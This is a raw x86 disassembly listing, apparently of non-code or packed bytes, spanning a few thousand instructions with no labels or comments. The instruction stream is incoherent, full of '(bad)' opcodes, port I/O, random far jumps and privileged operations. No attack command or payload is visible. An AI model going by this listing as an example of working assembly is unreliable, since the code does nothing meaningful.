  40dc99:	xor    BYTE PTR [ebx+0x5b],0x5
  40dc9d:	div    DWORD PTR [edx+ebx*8-0x44ec1c6]
  40dca4:	jne    0x40dcb5
  40dca6:	out    0xfb,eax
  40dca8:	mov    DWORD PTR [edx-0x27135765],esp
  40dcae:	bound  eax,QWORD PTR [edi+0x31e5dd0d]
  40dcb4:	imul   ebx,DWORD PTR [esi],0xbd95f4d0
  40dcba:	jne    0x40dcba
  40dcbc:	clc    
  40dcbd:	lds    esi,FWORD PTR es:[edx-0x51]
  40dcc1:	sub    esi,DWORD PTR [ebp+eiz*4-0x78]
  40dcc5:	add    cl,BYTE PTR [ebp+0x62224c0b]
  40dccb:	mov    BYTE PTR [eax-0x52406930],bl
  40dcd1:	aas    
  40dcd2:	in     al,0xc7
  40dcd4:	inc    ebp
  40dcd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcd6:	sbb    al,0xfc
  40dcd8:	int3   
  40dcd9:	dec    ebp
  40dcda:	cwde   
  40dcdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcdc:	xor    esi,edx
  40dcde:	shl    DWORD PTR [esi-0x59],0x59
  40dce2:	popw   ds
  40dce4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dce5:	das    
  40dce6:	add    eax,0x656e3b7d
  40dceb:	loopne 0x40dd01
  40dced:	fwait
  40dcee:	jle    0x40dd55
  40dcf0:	cmp    al,0x7d
  40dcf2:	mov    ecx,?
  40dcf4:	and    eax,ebx
  40dcf6:	rcl    dh,cl
  40dcf8:	dec    ecx
  40dcf9:	clc    
  40dcfa:	pop    ss
  40dcfb:	ja     0x40dd3a
  40dcfd:	ret    0x5f1c
  40dd00:	adc    DWORD PTR [edi-0x7a],ebx
  40dd03:	push   edi
  40dd04:	bound  eax,QWORD PTR [edx+eiz*1]
  40dd07:	cmp    eax,0x47a40032
  40dd0c:	or     edx,ecx
  40dd0e:	mov    ds:0x2d308b92,eax
  40dd13:	sbb    ecx,DWORD PTR [ebp-0x4e]
  40dd16:	sub    eax,0xb7e1cfc1
  40dd1b:	jecxz  0x40dd4e
  40dd1d:	dec    ebx
  40dd1e:	popa   
  40dd1f:	mov    ecx,0x664a7f39
  40dd24:	jmp    esp
  40dd26:	into   
  40dd27:	add    dl,BYTE PTR [ebp-0x56fed2cd]
  40dd2d:	inc    esi
  40dd2e:	xchg   ebx,eax
  40dd2f:	adc    al,0x61
  40dd31:	adc    eax,0xf371a8f5
  40dd36:	ror    BYTE PTR [ecx-0x7820a050],cl
  40dd3c:	test   dl,dl
  40dd3e:	clc    
  40dd3f:	mov    ah,0xf8
  40dd41:	or     DWORD PTR [edx+0x6c],0xa0630438
  40dd48:	or     BYTE PTR cs:[eax],ch
  40dd4b:	sub    al,0x73
  40dd4d:	and    eax,0x933bd523
  40dd52:	enter  0x687a,0xd0
  40dd56:	icebp  
  40dd57:	jle    0x40dd9a
  40dd59:	add    BYTE PTR [bp+di+0x7d],0x8a
  40dd5e:	pop    esp
  40dd5f:	lods   al,BYTE PTR ds:[esi]
  40dd60:	pop    ds
  40dd61:	jae    0x40dcfd
  40dd63:	out    0x44,eax
  40dd65:	sub    al,0xd5
  40dd67:	jbe    0x40ddbb
  40dd69:	jae    0x40ddb6
  40dd6b:	loope  0x40dd82
  40dd6d:	pop    esi
  40dd6f:	stc    
  40dd70:	mov    edi,0x19e5e5bf
  40dd75:	mov    edx,0x40019589
  40dd7a:	mov    dl,0x66
  40dd7c:	daa    
  40dd7d:	mov    al,0x2a
  40dd7f:	leave  
  40dd80:	pop    ebp
  40dd81:	mov    al,ds:0x931453cf
  40dd86:	call   0xe2cb:0x72928e0b
  40dd8d:	or     cl,BYTE PTR [ecx+0x7e]
  40dd90:	inc    edx
  40dd91:	fist   DWORD PTR [ebx]
  40dd93:	or     DWORD PTR [ecx-0x292eca9b],eax
  40dd99:	xor    edi,ecx
  40dd9b:	and    al,0x5b
  40dd9d:	push   ds
  40dd9e:	lahf   
  40dd9f:	gs dec esp
  40dda1:	addr16 fstp st(6)
  40dda4:	push   0xffffff95
  40dda6:	imul   edi,DWORD PTR [eax+eiz*8-0x19],0x1c991cbb
  40ddae:	inc    esi
  40ddaf:	mov    eax,0x27bca0ca
  40ddb4:	dec    edi
  40ddb5:	enter  0xa97,0xcf
  40ddb9:	test   ecx,ebx
  40ddbb:	test   al,0xcc
  40ddbd:	int    0x56
  40ddbf:	ins    BYTE PTR es:[edi],dx
  40ddc0:	xchg   esp,eax
  40ddc1:	retf   
  40ddc2:	dec    esi
  40ddc3:	push   0xb62d2d9f
  40ddc8:	add    DWORD PTR ds:0x773f1db1,edi
  40ddce:	scas   eax,DWORD PTR es:[edi]
  40ddcf:	push   eax
  40ddd0:	sub    bh,dh
  40ddd2:	jno    0x40dd9b
  40ddd4:	stos   BYTE PTR es:[edi],al
  40ddd5:	lock mov WORD PTR [ebx],cs
  40ddd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddd9:	daa    
  40ddda:	lahf   
  40dddb:	mov    esp,0xb4996d27
  40dde0:	ret    
  40dde1:	inc    ebx
  40dde2:	xchg   BYTE PTR [esi+esi*4+0x3b],bl
  40dde6:	rcl    BYTE PTR [edi+ebp*4],0x1a
  40ddea:	popf   
  40ddeb:	(bad)  
  40ddec:	mov    ah,0x76
  40ddee:	jmp    0x64ae445c
  40ddf3:	mov    dh,0xe1
  40ddf5:	push   ebx
  40ddf6:	or     eax,0xc9b9e998
  40ddfb:	mov    fs,WORD PTR [esi-0x433965f4]
  40de01:	mov    esi,esi
  40de03:	dec    eax
  40de04:	fwait
  40de05:	sti    
  40de06:	sbb    BYTE PTR [edx+0x1438205],ch
  40de0c:	xor    eax,0xd5fc1fcf
  40de11:	in     al,dx
  40de12:	mov    al,0xf2
  40de14:	and    ebp,DWORD PTR [eax-0x4e]
  40de17:	jl     0x40de21
  40de19:	cmp    ecx,edi
  40de1b:	(bad)  
  40de1c:	jp     0x40de1a
  40de1e:	fidiv  DWORD PTR [edx]
  40de20:	(bad)  
  40de22:	xor    eax,0x34b465af
  40de27:	mov    ds:0xac5ea1f7,eax
  40de2c:	or     DWORD PTR [esi],ebp
  40de2e:	xor    bh,ah
  40de30:	push   ss
  40de31:	inc    esi
  40de32:	push   ebx
  40de33:	fmul   DWORD PTR [eax+edi*8-0x4c]
  40de37:	push   edi
  40de38:	jns    0x40de6b
  40de3a:	sub    dh,BYTE PTR [ebp+0x62c5503f]
  40de40:	or     DWORD PTR [edi],0x37
  40de43:	xor    BYTE PTR [ecx+0x54],al
  40de46:	mov    bh,BYTE PTR [eax-0x73]
  40de49:	lods   al,BYTE PTR ds:[esi]
  40de4a:	lock mov eax,ds:0xe76d2628
  40de50:	pushf  
  40de51:	or     ah,bh
  40de53:	sub    dh,BYTE PTR [edi-0x63]
  40de56:	mov    dl,BYTE PTR [eax-0x5f]
  40de59:	sbb    ebx,DWORD PTR [ebx]
  40de5b:	ins    BYTE PTR es:[edi],dx
  40de5c:	dec    esp
  40de5e:	adc    eax,DWORD PTR [ecx+0x371f978f]
  40de64:	push   ebp
  40de65:	stc    
  40de66:	fisttp QWORD PTR [esi-0x3d]
  40de69:	ja     0x40de69
  40de6b:	jge    0x40decc
  40de6d:	xchg   BYTE PTR [edx-0x69b205e8],al
  40de73:	in     eax,0x28
  40de75:	test   DWORD PTR [ecx-0x40],ebp
  40de78:	mov    esi,DWORD PTR [edi-0x24f0ee0]
  40de7e:	mov    ds:0xfa6ba454,eax
  40de83:	add    BYTE PTR [ebp-0x3cc573f5],ah
  40de89:	pop    ebx
  40de8a:	gs mov edx,0x8f1c62cb
  40de90:	and    al,0x21
  40de92:	test   cl,al
  40de94:	adc    eax,0x5a3561f6
  40de99:	push   ebp
  40de9a:	fbstp  TBYTE PTR [edi]
  40de9c:	inc    esp
  40de9d:	ja     0x40deb8
  40de9f:	sti    
  40dea0:	sub    eax,0x235be871
  40dea5:	sub    al,0xf9
  40dea7:	nop
  40dea8:	dec    ecx
  40dea9:	out    0xf3,eax
  40deab:	xchg   ebp,eax
  40deac:	mov    dl,0x18
  40deae:	inc    esi
  40deaf:	jp     0x40de85
  40deb1:	repz mov al,ds:0xacd09f6a
  40deb7:	pop    edx
  40deb8:	or     BYTE PTR [edx-0x78d54ed3],0x17
  40debf:	lock popf 
  40dec1:	xor    bl,BYTE PTR [edx]
  40dec3:	mov    al,ds:0x5084a0f
  40dec8:	add    eax,0xd96bbe4b
  40decd:	ficomp WORD PTR [edi+0x57]
  40ded0:	and    eax,DWORD PTR ds:[edx-0x66]
  40ded4:	or     al,BYTE PTR [edi-0x1ced15ad]
  40deda:	fsub   QWORD PTR [bx+di-0x1a6b]
  40dedf:	shl    bl,0x22
  40dee2:	xchg   DWORD PTR [ebp-0x17],eax
  40dee5:	xchg   edx,eax
  40dee6:	push   0xb4e9b291
  40deeb:	sbb    eax,0xb07b2783
  40def0:	adc    al,0x7e
  40def2:	int3   
  40def3:	xchg   ecx,eax
  40def4:	jle    0x40df61
  40def6:	mov    ds:0xc4376524,eax
  40defb:	stc    
  40defc:	dec    eax
  40defd:	sbb    ebp,ebp
  40deff:	jnp    0x40dea6
  40df01:	cmp    al,0xcb
  40df03:	xor    BYTE PTR [edx+0x28],dh
  40df06:	xor    esi,DWORD PTR [esp+eax*2]
  40df09:	or     DWORD PTR [edi+0x3f55a84e],ebp
  40df0f:	out    dx,al
  40df10:	in     al,dx
  40df11:	mov    dh,BYTE PTR [ebp+edx*1+0x6d]
  40df15:	push   es
  40df16:	pop    edx
  40df17:	push   ss
  40df18:	adc    ch,cl
  40df1a:	mov    ch,0x77
  40df1c:	xor    edi,edi
  40df1e:	leave  
  40df1f:	fstp   QWORD PTR [ecx-0x14]
  40df22:	es (bad) 
  40df24:	iret   
  40df25:	or     BYTE PTR [esi],ch
  40df27:	lods   eax,DWORD PTR ds:[esi]
  40df28:	sub    eax,0xb793f06e
  40df2d:	dec    ebx
  40df2e:	mov    eax,0x1073767f
  40df33:	fwait
  40df34:	sub    esi,0x3d7f3108
  40df3a:	iret   
  40df3b:	cs push eax
  40df3d:	mov    edx,0xa50fe86f
  40df42:	push   ebx
  40df43:	mov    esi,0x58cb9e94
  40df48:	dec    ecx
  40df49:	aad    0xfa
  40df4b:	or     eax,0x1aa7641
  40df50:	adc    BYTE PTR [esi+0x14],al
  40df53:	pop    eax
  40df54:	clc    
  40df55:	mov    edx,0x997b56f
  40df5a:	mov    cl,0x81
  40df5c:	fwait
  40df5d:	push   0xd9370643
  40df62:	lods   eax,DWORD PTR ds:[esi]
  40df63:	fwait
  40df64:	jg     0x40df1d
  40df66:	add    BYTE PTR [edx+0x12c9b329],0x5d
  40df6d:	xor    ch,BYTE PTR [esi-0x4a8d2057]
  40df73:	and    al,0x77
  40df75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df76:	out    dx,al
  40df77:	sbb    edx,esi
  40df79:	into   
  40df7a:	leave  
  40df7b:	sbb    eax,0x10c46805
  40df80:	xchg   ebp,eax
  40df81:	test   ebx,esp
  40df83:	scas   eax,DWORD PTR es:[edi]
  40df84:	xchg   edx,eax
  40df85:	test   edx,esi
  40df87:	cdq    
  40df88:	jne    0x40dfe3
  40df8a:	mov    ecx,0xa4deaeef
  40df8f:	les    ebp,FWORD PTR [ebx+0x6ee3200b]
  40df95:	adc    ch,al
  40df97:	cmp    al,0x90
  40df99:	fistp  WORD PTR [ecx+0x4d]
  40df9c:	mov    BYTE PTR [ecx],al
  40df9e:	lods   eax,DWORD PTR ds:[esi]
  40df9f:	mov    al,0x2c
  40dfa1:	push   es
  40dfa2:	sbb    eax,0x7145c20c
  40dfa7:	data16 and al,0xc1
  40dfaa:	ins    BYTE PTR es:[edi],dx
  40dfab:	dec    edx
  40dfac:	loope  0x40dfc4
  40dfae:	neg    BYTE PTR [ebx+ebx*4+0x3f]
  40dfb2:	jle    0x40dfb5
  40dfb4:	scas   al,BYTE PTR es:[edi]
  40dfb5:	xchg   ebx,eax
  40dfb6:	jne    0x40e022
  40dfb8:	xchg   ebp,eax
  40dfb9:	inc    eax
  40dfba:	mov    bl,0x33
  40dfbc:	enter  0x7995,0x3f
  40dfc0:	sbb    bl,dh
  40dfc2:	fs push esi
  40dfc4:	xchg   esi,eax
  40dfc5:	shr    DWORD PTR ds:0x69044e0f,1
  40dfcb:	(bad)  
  40dfcc:	dec    ebp
  40dfcd:	push   es
  40dfce:	iret   
  40dfcf:	push   esi
  40dfd0:	pusha  
  40dfd1:	mov    dl,0x76
  40dfd3:	loopne 0x40e00a
  40dfd5:	mov    ebx,0xfe45f235
  40dfda:	mov    bh,0xb3
  40dfdc:	mov    ah,0x8
  40dfde:	cmp    eax,DWORD PTR [ebx+0x2210cd70]
  40dfe4:	lds    ebx,FWORD PTR [esi-0x6b15a959]
  40dfea:	int3   
  40dfeb:	sbb    ebp,ebx
  40dfed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfee:	stos   DWORD PTR es:[edi],eax
  40dfef:	call   0x11ad:0xf32a5b4f
  40dff6:	(bad)  
  40dff7:	(bad)  
  40dff8:	adc    BYTE PTR [edx+0x23b0fad1],bh
  40dffe:	xchg   ebp,eax
  40dfff:	xor    bl,BYTE PTR [ecx+0x19f497db]
  40e005:	popf   
  40e006:	jae    0x40dff1
  40e008:	inc    eax
  40e009:	bound  ebx,QWORD PTR [edx]
  40e00b:	push   ss
  40e00c:	fldenv [eax-0x44d26e63]
  40e012:	cld    
  40e013:	mov    bl,0xd7
  40e015:	jle    0x40e06d
  40e017:	(bad)  
  40e018:	jns    0x40e07e
  40e01a:	xor    eax,0xc0cb8165
  40e01f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e020:	add    DWORD PTR ds:0xf4843df4,ecx
  40e026:	sti    
  40e027:	xchg   ebx,eax
  40e028:	in     al,dx
  40e029:	retf   0x8c1d
  40e02c:	sbb    al,0xc6
  40e02e:	mov    esp,0x6f377e79
  40e033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e034:	lods   al,BYTE PTR ds:[esi]
  40e035:	enter  0xcea7,0x92
  40e039:	pop    ebp
  40e03a:	xor    DWORD PTR [eax-0x17],edi
  40e03d:	dec    ebx
  40e03e:	jecxz  0x40e015
  40e040:	les    ecx,FWORD PTR [ecx+ebp*2]
  40e043:	fwait
  40e044:	push   ecx
  40e045:	jae    0x40dff8
  40e047:	add    al,0xbc
  40e049:	sub    BYTE PTR [ecx+0x49],al
  40e04c:	adc    bl,BYTE PTR [edi+0x405ccfab]
  40e052:	inc    bh
  40e054:	jl     0x40dfe1
  40e056:	mov    esi,0x2275c996
  40e05b:	cmp    BYTE PTR [ebx],ah
  40e05d:	scas   al,BYTE PTR es:[edi]
  40e05e:	mov    bl,0xf6
  40e060:	cmp    DWORD PTR [eax+edx*2+0x4f],0xf9abbb09
  40e068:	repnz push 0xffffff86
  40e06b:	mov    al,ds:0xa42a960f
  40e070:	mov    cl,bh
  40e072:	inc    esp
  40e073:	data16 (bad) 
  40e075:	div    ebp
  40e077:	and    DWORD PTR [bx+di+0x144c],esp
  40e07c:	mov    DWORD PTR [eax],ebp
  40e07e:	lea    esp,[edx]
  40e080:	mov    esp,DWORD PTR [edx+0x4e]
  40e083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e084:	out    dx,eax
  40e085:	inc    edx
  40e086:	mov    fs,WORD PTR [esi]
  40e088:	loopne 0x40e0f7
  40e08a:	inc    edx
  40e08b:	es cwde 
  40e08d:	imul   esp,DWORD PTR [edx+0xed4fe0c],0xffffffff
  40e094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e095:	dec    eax
  40e096:	xor    eax,esi
  40e098:	add    DWORD PTR [eax+0x36515d8d],ebx
  40e09e:	mov    al,0x4b
  40e0a0:	idiv   BYTE PTR [esi]
  40e0a2:	loope  0x40e11f
  40e0a4:	hlt    
  40e0a5:	ds ret 0x109e
  40e0a9:	scas   al,BYTE PTR es:[edi]
  40e0aa:	das    
  40e0ab:	popa   
  40e0ac:	mov    ds,WORD PTR [ebx]
  40e0ae:	call   0x1fb5:0x22638614
  40e0b5:	sub    esp,DWORD PTR [ebx+eiz*8+0x14ba7104]
  40e0bc:	jnp    0x40e125
  40e0be:	xor    eax,0xfc2c3a71
  40e0c3:	shl    DWORD PTR [edx],1
  40e0c5:	pop    ecx
  40e0c6:	add    al,0xca
  40e0c8:	add    BYTE PTR [ecx+0x17],bh
  40e0cb:	cmp    al,0x5b
  40e0cd:	xchg   ecx,eax
  40e0ce:	ss push 0x65132163
  40e0d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0d5:	xchg   ecx,eax
  40e0d6:	push   ecx
  40e0d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0d8:	in     al,0xa3
  40e0da:	jmp    0xc7ca:0x4a8ad2a3
  40e0e1:	leave  
  40e0e2:	jbe    0x40e0f2
  40e0e4:	mov    edi,esp
  40e0e6:	lods   al,BYTE PTR ds:[esi]
  40e0e7:	or     cl,dl
  40e0e9:	popa   
  40e0ea:	in     al,dx
  40e0eb:	ret    0x497
  40e0ee:	mov    bl,0x64
  40e0f0:	rol    DWORD PTR [ebp-0x44],1
  40e0f3:	div    DWORD PTR [edi-0x54]
  40e0f6:	mov    dl,0xc8
  40e0f8:	neg    BYTE PTR [edi+0x6b7980a3]
  40e0fe:	sub    DWORD PTR [ebp+ebp*8-0x37472907],edi
  40e105:	int3   
  40e106:	add    edx,DWORD PTR [edi]
  40e108:	idiv   BYTE PTR [edx]
  40e10a:	and    DWORD PTR [edx+0x42202c3d],esi
  40e110:	(bad)  
  40e111:	push   edx
  40e112:	cwde   
  40e113:	pop    esp
  40e114:	mov    ch,0xbf
  40e116:	cmp    BYTE PTR [ebp+0x4d],ah
  40e119:	and    ebp,eax
  40e11b:	lea    ebx,[ecx+0xf]
  40e11e:	add    dh,BYTE PTR [eax+0x37]
  40e121:	out    0xac,eax
  40e123:	push   esi
  40e124:	add    DWORD PTR ds:0xace4a17a,0x382ced75
  40e12e:	aas    
  40e12f:	mov    ch,0x69
  40e131:	lods   eax,DWORD PTR fs:[esi]
  40e133:	outs   dx,BYTE PTR ds:[esi]
  40e134:	test   dh,ah
  40e136:	(bad)  
  40e138:	or     al,0xf3
  40e13a:	push   0x40ccec84
  40e13f:	mov    edi,0xcd4be601
  40e144:	mov    ebp,0x5cbbfb48
  40e149:	pop    ebx
  40e14a:	and    edx,DWORD PTR [ebx+0x6bd7f673]
  40e150:	mov    ds:0x487161ac,al
  40e155:	repnz (bad) 
  40e157:	xchg   esi,eax
  40e158:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40e15a:	jle    0x40e188
  40e15c:	cld    
  40e15d:	inc    ecx
  40e15e:	jl     0x40e0fe
  40e160:	shl    esp,0x7a
  40e163:	jns    0x40e1b5
  40e165:	shl    BYTE PTR [ebp+0xb2e3de2],1
  40e16b:	mov    DWORD PTR [esi+0x10],edi
  40e16e:	fld    DWORD PTR [ebx-0x629565e7]
  40e174:	mov    ebp,0xe8b45237
  40e179:	test   BYTE PTR [esi-0x610f5370],0xcb
  40e180:	xchg   ebx,eax
  40e181:	ret    
  40e182:	test   di,di
  40e185:	mov    eax,0x6c461ee8
  40e18a:	jge    0x40e12f
  40e18c:	mov    ecx,0xeb92d52d
  40e191:	inc    eax
  40e192:	js     0x40e177
  40e194:	mov    edi,0x51d556c4
  40e199:	in     al,0x94
  40e19b:	in     al,dx
  40e19c:	(bad)  
  40e19d:	fstp   TBYTE PTR [edx-0x1fd8e464]
  40e1a3:	retf   0xbc35
  40e1a6:	cdq    
  40e1a7:	test   DWORD PTR gs:[edi],eax
  40e1aa:	xor    eax,0xffd171df
  40e1af:	jg     0x40e210
  40e1b1:	mov    dl,0x97
  40e1b3:	mov    BYTE PTR [ecx],0x16
  40e1b6:	adc    al,0xdd
  40e1b8:	loop   0x40e213
  40e1ba:	(bad)
  40e1be:	lods   al,BYTE PTR ss:[esi]
  40e1c0:	push   0x358ccb83
  40e1c5:	mov    ah,0x51
  40e1c7:	imul   esp,DWORD PTR cs:0x5f5bbcec,0x43
  40e1cf:	push   esp
  40e1d0:	xchg   ebx,eax
  40e1d1:	mov    dl,0x15
  40e1d3:	adc    eax,0x847d1eb5
  40e1d8:	cmc    
  40e1d9:	cwde   
  40e1da:	icebp  
  40e1db:	lock in al,dx
  40e1dd:	test   DWORD PTR [edx-0x196e9140],edi
  40e1e3:	imul   edi,esi,0xffffff98
  40e1e6:	(bad)  
  40e1e7:	push   0x4c0df718
  40e1ec:	mov    DWORD PTR [edi-0x22],edi
  40e1ef:	test   DWORD PTR [ecx-0xe56141c],0xf2152dab
  40e1f9:	nop
  40e1fa:	jle    0x40e1f6
  40e1fc:	mov    bl,0x72
  40e1fe:	nop
  40e1ff:	mov    ss,ebp
  40e201:	cmp    DWORD PTR [edx+0x30],ecx
  40e204:	sbb    ah,cl
  40e206:	and    eax,DWORD PTR [edx+0x26fe8a]
  40e20c:	cwde   
  40e20d:	xor    eax,0x511c9028
  40e212:	or     ah,al
  40e214:	pop    ecx
  40e215:	leave  
  40e216:	mov    bl,0x3f
  40e218:	stc    
  40e219:	retf   
  40e21a:	pop    edx
  40e21b:	(bad)  
  40e21c:	mov    al,0x5
  40e21e:	dec    edx
  40e21f:	cwde   
  40e220:	push   esi
  40e221:	add    eax,0xe87e8e71
  40e226:	push   edx
  40e227:	push   es
  40e228:	or     eax,0xcda414ba
  40e22d:	loopne 0x40e1ee
  40e22f:	std    
  40e230:	pop    edx
  40e231:	jle    0x40e20b
  40e233:	imul   ebx,DWORD PTR [edi+0x2cdad648],0xffffff9a
  40e23a:	daa    
  40e23b:	mov    edx,0x63e01263
  40e240:	(bad)  
  40e241:	shr    BYTE PTR ds:0x8273af41,cl
  40e247:	int    0x33
  40e249:	xchg   esi,eax
  40e24a:	inc    ecx
  40e24b:	outs   dx,BYTE PTR ds:[esi]
  40e24c:	sub    eax,0x491da726
  40e251:	sub    eax,0xb6437e23
  40e256:	jo     0x40e24e
  40e258:	xchg   BYTE PTR [edi-0xd],ch
  40e25b:	jle    0x40e200
  40e25d:	imul   ebx,DWORD PTR [ecx-0x2eedead8],0xffffff8b
  40e264:	into   
  40e265:	add    eax,0xa683c3dc
  40e26a:	sub    eax,DWORD PTR [ebp+0x4]
  40e26d:	pop    eax
  40e26e:	mov    ebp,0xce5a94f0
  40e273:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e274:	in     eax,0x23
  40e276:	mov    ebx,0x887654a
  40e27c:	ins    DWORD PTR es:[edi],dx
  40e27d:	pop    esi
  40e27e:	jl     0x40e26f
  40e280:	imul   edx,ebx,0x309cdb8a
  40e286:	(bad)  
  40e287:	pop    ds
  40e288:	pop    edx
  40e289:	push   edx
  40e28a:	add    DWORD PTR [esi],ecx
  40e28c:	(bad)  
  40e28d:	sub    eax,0x22fe07b
  40e292:	mov    esp,0xb450a10d
  40e297:	scas   eax,DWORD PTR es:[edi]
  40e298:	add    eax,0x53eed896
  40e29d:	aad    0xa6
  40e29f:	pop    esi
  40e2a0:	xchg   ecx,eax
  40e2a1:	cmc    
  40e2a2:	(bad)  
  40e2a3:	aad    0xba
  40e2a5:	outs   dx,BYTE PTR ds:[esi]
  40e2a6:	jg     0x40e255
  40e2a8:	mov    edi,0x764c77b1
  40e2ad:	repnz lahf 
  40e2af:	push   ecx
  40e2b0:	and    DWORD PTR [ebx+0x39704411],edx
  40e2b6:	popf   
  40e2b7:	in     eax,0xb
  40e2b9:	mov    ch,0xec
  40e2bb:	int    0x2e
  40e2bd:	add    al,0xfd
  40e2bf:	cmp    eax,0x3dd2a95b
  40e2c4:	pop    ds
  40e2c5:	fidiv  DWORD PTR [edx+0x1e]
  40e2c8:	cmp    al,0x24
  40e2ca:	inc    esi
  40e2cb:	loopne 0x40e28d
  40e2cd:	call   0xf53c:0x361d7b44
  40e2d4:	inc    esi
  40e2d5:	mov    ?,WORD PTR [eax+0x3]
  40e2d8:	push   esi
  40e2d9:	sub    BYTE PTR [ecx+ebx*1+0x366fe99e],al
  40e2e0:	(bad)  
  40e2e1:	cli    
  40e2e2:	sub    eax,DWORD PTR [ebp+0x6ec31d87]
  40e2e8:	aam    0x2d
  40e2ea:	jmp    0xfbe9:0x57bebfaf
  40e2f1:	xchg   esp,eax
  40e2f2:	icebp  
  40e2f3:	fimul  WORD PTR [ecx+0x16f60a78]
  40e2f9:	ins    DWORD PTR es:[edi],dx
  40e2fa:	rcl    BYTE PTR [ebx+0x4089ac6d],1
  40e300:	xor    DWORD PTR [esi+esi*4],edi
  40e303:	or     eax,0x882617ed
  40e308:	add    cl,ch
  40e30a:	in     al,0x24
  40e30c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e30d:	les    edi,FWORD PTR [eax+0x2cbc965a]
  40e313:	enter  0x6715,0x82
  40e317:	int3   
  40e318:	mov    edi,cr2
  40e31b:	xor    cl,BYTE PTR [esi-0x7a]
  40e31e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e31f:	imul   esi,DWORD PTR [edi+0x5d],0xb5da860e
  40e326:	scas   eax,DWORD PTR es:[edi]
  40e327:	jno    0x40e345
  40e329:	dec    ebx
  40e32a:	nop
  40e32b:	out    0x3f,eax
  40e32d:	jecxz  0x40e2ba
  40e32f:	jnp    0x40e370
  40e331:	cmc    
  40e332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e333:	stos   BYTE PTR es:[edi],al
  40e334:	push   ecx
  40e335:	jns    0x40e39e
  40e337:	push   es
  40e338:	xor    eax,0x60f3a920
  40e33d:	xchg   ecx,eax
  40e33e:	mov    al,ds:0x6a4b5ad5
  40e343:	cmp    al,BYTE PTR [ecx]
  40e345:	and    ah,ah
  40e347:	stos   BYTE PTR es:[edi],al
  40e348:	ret    0xa077
  40e34b:	jp     0x40e334
  40e34d:	in     eax,dx
  40e34e:	mov    cl,0x43
  40e350:	inc    esp
  40e351:	adc    ebp,esi
  40e353:	push   ebx
  40e354:	test   BYTE PTR [edi+eax*4-0x6f],al
  40e358:	aad    0x51
  40e35a:	adc    cl,BYTE PTR [eax-0x5d]
  40e35d:	push   0xc5c4175d
  40e362:	fwait
  40e363:	call   0x77e5a988
  40e368:	lea    esp,[eax+0xa]
  40e36b:	mov    DWORD PTR [ebx+0x30],edi
  40e36e:	fwait
  40e36f:	cmp    al,BYTE PTR es:[eax+ebx*8+0x53]
  40e374:	cwde   
  40e375:	and    eax,0x26
  40e378:	dec    esi
  40e379:	(bad)  
  40e37b:	je     0x40e34d
  40e37d:	xchg   esp,eax
  40e37e:	xchg   esp,eax
  40e37f:	xchg   DWORD PTR [edi-0x31],edi
  40e382:	sbb    DWORD PTR [eax],esp
  40e384:	and    DWORD PTR [esi],ebp
  40e386:	adc    bl,ah
  40e388:	loop   0x40e365
  40e38a:	(bad)  
  40e38b:	mov    DWORD PTR [edi-0x2619fd6b],ebx
  40e391:	mov    BYTE PTR [ebp+0x7f],ch
  40e394:	jb     0x40e3c8
  40e396:	push   esp
  40e397:	ds mov dh,0x85
  40e39a:	mov    ds:0xaf81bccc,al
  40e39f:	lock test BYTE PTR [esi],dh
  40e3a2:	lods   eax,DWORD PTR ds:[esi]
  40e3a3:	in     al,dx
  40e3a4:	or     DWORD PTR [edi],ebp
  40e3a6:	xor    DWORD PTR [edx+0x7b],esi
  40e3a9:	call   0x39bb0556
  40e3ae:	mov    ah,0x86
  40e3b0:	bound  eax,QWORD PTR [ebx-0x6d]
  40e3b3:	sbb    al,0x4e
  40e3b5:	cdq    
  40e3b6:	mov    cl,0xcb
  40e3b8:	xor    cl,ch
  40e3ba:	xchg   edi,eax
  40e3bb:	in     eax,dx
  40e3bc:	pop    edx
  40e3bd:	bound  edi,QWORD PTR [esi+0x71]
  40e3c0:	fcom   DWORD PTR [edi]
  40e3c2:	xchg   edx,eax
  40e3c3:	enter  0xf5a0,0xcd
  40e3c7:	push   esp
  40e3c8:	xchg   ebp,eax
  40e3c9:	clc    
  40e3ca:	mov    bl,BYTE PTR [eax+0x47]
  40e3cd:	punpcklbw mm2,DWORD PTR [ecx-0x6eba7ea1]
  40e3d4:	mov    DWORD PTR [eax-0x3ac22e74],esp
  40e3da:	dec    esp
  40e3db:	xor    cl,ah
  40e3dd:	xchg   edi,eax
  40e3de:	outs   dx,DWORD PTR ds:[esi]
  40e3df:	fs push cs
  40e3e1:	mov    bh,cl
  40e3e3:	sbb    eax,0xb8c59fa8
  40e3e8:	fs in  eax,dx
  40e3ea:	or     bh,BYTE PTR [ebx+0x6f4aee5]
  40e3f0:	popa   
  40e3f1:	jo     0x40e44f
  40e3f3:	mov    dl,0x5b
  40e3f5:	ret    0x1c57
  40e3f8:	xchg   esp,esi
  40e3fa:	aas    
  40e3fb:	out    dx,al
  40e3fc:	sbb    BYTE PTR [edx-0x6ca10465],bl
  40e402:	pop    esi
  40e403:	vpmaxub ymm0,ymm7,YMMWORD PTR [esi+0x59df32fb]
  40e40b:	bound  ebp,QWORD PTR [ebx-0x4a]
  40e40e:	push   cs
  40e40f:	jp     0x40e3f3
  40e411:	and    bh,bl
  40e413:	xchg   esp,eax
  40e414:	in     eax,0x1f
  40e416:	out    dx,al
  40e417:	pop    ds
  40e418:	aas    
  40e419:	in     al,0xad
  40e41b:	add    al,0x1
  40e41d:	addr16 aas 
  40e41f:	aad    0x8d
  40e421:	fist   DWORD PTR [esp]
  40e424:	push   eax
  40e425:	sub    eax,0xe9cf6904
